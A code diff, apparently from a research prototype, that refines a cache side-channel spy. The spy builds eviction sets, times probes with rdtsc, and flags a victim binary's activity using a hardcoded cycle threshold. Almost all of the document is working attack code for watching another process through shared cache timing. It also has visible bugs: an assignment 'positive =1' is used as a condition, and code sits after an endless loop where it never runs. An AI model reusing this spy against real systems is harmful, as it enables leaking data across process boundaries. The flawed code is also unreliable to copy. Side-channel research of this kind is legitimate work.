@@ -44,7 +44,8 @@ void init_spy(char *target_filepath, int offset_target){
     // printf("victim read\n");
 
     // prepare evset
-    Config *spy_conf= config_init(24, 2048, 64, 106, 2097152, 1, 1);
+    // Config *spy_conf= config_init(16, 2048, 64, 106, 2097152, 1, 1);
+    Config *spy_conf= config_init(16, 2048, 64, 106, 2097152, 1, 1);
     init_evset(spy_conf);
     printf("[+] spy: init evset done\n");
     spy_evsets = find_evset(spy_conf, victim);
@@ -63,43 +64,89 @@ static __inline__ unsigned long long rdtsc(void)
     return x;
 }
 
+uint64_t findMin(const uint64_t *array, size_t n) {
+    // Handle empty array case
+    if (n == 0) return 0; // Or any other appropriate value
+
+    uint64_t min = array[0];
+    for (size_t i = 1; i < n; ++i) if (array[i] < min) min = array[i];
+    return min;
+}
+
+uint64_t findMax(const uint64_t *array, size_t n) {
+    // Handle empty array case
+    if (n == 0) return 0; // Or any other appropriate value  
+    
+    uint64_t max = array[0];
+    for (size_t i = 1; i < n; ++i) if (array[i] > max) max = array[i];
+    return max;
+}
+
+#define REPS_NO 100000
 void my_monitor(){
     int ctr =0, evset_probetime;
     unsigned long long old_tsc, tsc = rdtsc();
-    probe_chase_loop(victim_copy, 1);
-    probe_chase_loop(victim, 1);
-    probe_evset_chase(*spy_evsets);
-    probe_evset_chase(*spy_evsets);
-    // void *my_victim = map("./build/victim", 0x11a8);
+
+    wait(1E9);
+    probe_evset_chase_once(*spy_evsets);
+    for(int i=0;i<REPS_NO;i++) msrmts_spy[i] = probe_evset_chase_once(*spy_evsets);
+    for(int i=0;i<100;i++) printf("%lu; ", msrmts_spy[i]);
+    for(int i=REPS_NO/2;i<REPS_NO/2+100;i++) printf("%lu; ", msrmts_spy[i]);
+    printf("\n");
+    printf("no access, min %lu, max %lu , median %lu\n", findMin(msrmts_spy, REPS_NO), findMax(msrmts_spy, REPS_NO), median_uint64(msrmts_spy, REPS_NO));
+
+    for(int i=0;i<REPS_NO;i++) {
+        asm __inline__("mfence;");
+        probe_chase_loop(victim, 1);
+        msrmts_spy[i] = probe_evset_chase_once(*spy_evsets);
+    }
+    for(int i=0;i<100;i++) printf("%lu; ", msrmts_spy[i]);
+    for(int i=REPS_NO/2;i<REPS_NO/2+100;i++) printf("%lu; ", msrmts_spy[i]);
+    printf("\n");
+    printf("access, min %lu, max %lu , median %lu\n", findMin(msrmts_spy, REPS_NO), findMax(msrmts_spy, REPS_NO), median_uint64(msrmts_spy, REPS_NO));
 
 
-    int timing1 = probe_chase_loop(victim, 1);
-    int timing2 = probe_chase_loop(victim, 1);
-    probe_evset_chase(*spy_evsets);
-    int timing3 = probe_chase_loop(victim_copy, 1);
-    int timing4 = probe_chase_loop(victim, 1);
 
-    printf("%d %d %d %d\n", timing1, timing2, timing3, timing4);
+    probe_evset_chase_once(*spy_evsets);
+    for(int i=0;i<REPS_NO;i++) msrmts_spy[i] = probe_evset_chase_once(*spy_evsets);
+    for(int i=0;i<100;i++) printf("%lu; ", msrmts_spy[i]);
+    for(int i=REPS_NO/2;i<REPS_NO/2+100;i++) printf("%lu; ", msrmts_spy[i]);
+    printf("\n");
+    printf("no access, min %lu, max %lu , median %lu\n", findMin(msrmts_spy, REPS_NO), findMax(msrmts_spy, REPS_NO), median_uint64(msrmts_spy, REPS_NO));
+
+
+    probe_evset_chase(*spy_evsets);
+    probe_evset_chase(*spy_evsets);
+    // printf("b\n");
+    int positive=0;
     while(1)
     {
+        // positive=0;
         old_tsc = tsc;
         tsc=rdtsc();
         while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
         {
             tsc = rdtsc();
         }
-        msrmts_spy[ctr]= probe_chase_loop(victim, 1);
-        probe_evset_chase(*spy_evsets);
-        evset_probetime = probe_evset_chase(*spy_evsets);
-        if(msrmts_spy[ctr] < conf->threshold) {
-            printf("[!] my_monitor: victim acitivity detected! cycles %lu, ctr %d, evset_probetime %lu\n", msrmts_spy[ctr], ctr, evset_probetime);
+        // probe_evset_chase(*spy_evsets);
+        msrmts_spy[ctr] = probe_evset_chase_once(*spy_evsets);
+        if(msrmts_spy[ctr] > 890 && msrmts_spy[ctr] < 1150) { // hardcoded evset threshold
+            if(positive =1) printf("[!] my_monitor: victim acitivity detected! cycles %lu, ctr %d\n", msrmts_spy[ctr], ctr);
+            // positive=1;
+            // break;
         }
+        probe_evset_chase(*spy_evsets);
+        probe_evset_chase(*spy_evsets);
+        probe_evset_chase(*spy_evsets);
+        probe_evset_chase(*spy_evsets);
+        probe_evset_chase(*spy_evsets);
+        probe_evset_chase(*spy_evsets);
         ctr++;
         if(ctr >= 1000000) ctr=0;
     }
     
-    for(int i=0;i<100000;i++) printf("%lu; ", msrmts_spy[i]);
-    printf("\n ctr %d \n", ctr);
+    // for(int i=0;i<20;i++) printf("%lu; ", msrmts_spy[i]);
+    // printf("\n ctr %d \n", ctr);
 }
 
 void spy(char *victim_filepath, int offset_target){
